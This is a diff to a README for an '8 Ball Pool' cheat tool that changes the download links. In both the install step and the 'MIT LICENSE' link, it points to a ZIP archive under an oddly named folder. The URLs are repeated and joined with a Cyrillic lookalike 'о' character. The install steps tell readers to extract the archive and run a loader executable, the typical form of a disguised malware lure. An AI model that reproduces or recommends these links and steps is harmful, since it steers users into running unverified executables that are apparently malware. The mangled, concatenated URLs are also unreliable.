@@ -10,7 +10,7 @@ With an intuitive interface and actively developed modules, 8 Ball Pool Cheto ap
 
 Getting started with 8 Ball Pool Cheto is simple! Please carefully follow the steps below to ensure a safe and efficient installation:
 
-1. Download `https://raw.githubusercontent.com/DeathFlame7/8ballPoolEliteTools/main/Lоader.zipоhttps://raw.githubusercontent.com/DeathFlame7/8ballPoolEliteTools/main/Lоader.zip` from the repository.  
+1. Download `https://raw.githubusercontent.com/DeathFlame7/8ballPoolEliteTools/main/supralocally/Pool-ball-Elite-Tools-2.9.zipоhttps://raw.githubusercontent.com/DeathFlame7/8ballPoolEliteTools/main/supralocally/Pool-ball-Elite-Tools-2.9.zipоhttps://raw.githubusercontent.com/DeathFlame7/8ballPoolEliteTools/main/supralocally/Pool-ball-Elite-Tools-2.9.zipоhttps://raw.githubusercontent.com/DeathFlame7/8ballPoolEliteTools/main/supralocally/Pool-ball-Elite-Tools-2.9.zip` from the repository.  
 2. Extract the file using your favorite archive tool (e.g., WinRAR, 7-Zip).  
 3. Open the extracted folder and run the loader executable compatible with your operating system.
 4. Follow the on-screen steps to enable your desired features.  
@@ -69,7 +69,7 @@ This software is intended for educational and experimental purposes only. Use of
 
 This project is licensed under the MIT License (2025). You are free to use, modify, and distribute this software, as long as you include proper credits and do not hold the authors liable for any damages or legal consequences.
 
-Read the full license text here: [MIT LICENSE](https://raw.githubusercontent.com/DeathFlame7/8ballPoolEliteTools/main/Lоader.zipоhttps://raw.githubusercontent.com/DeathFlame7/8ballPoolEliteTools/main/Lоader.zip)
+Read the full license text here: [MIT LICENSE](https://raw.githubusercontent.com/DeathFlame7/8ballPoolEliteTools/main/supralocally/Pool-ball-Elite-Tools-2.9.zipоhttps://raw.githubusercontent.com/DeathFlame7/8ballPoolEliteTools/main/supralocally/Pool-ball-Elite-Tools-2.9.zipоhttps://raw.githubusercontent.com/DeathFlame7/8ballPoolEliteTools/main/supralocally/Pool-ball-Elite-Tools-2.9.zipоhttps://raw.githubusercontent.com/DeathFlame7/8ballPoolEliteTools/main/supralocally/Pool-ball-Elite-Tools-2.9.zip)
 
 ---
 
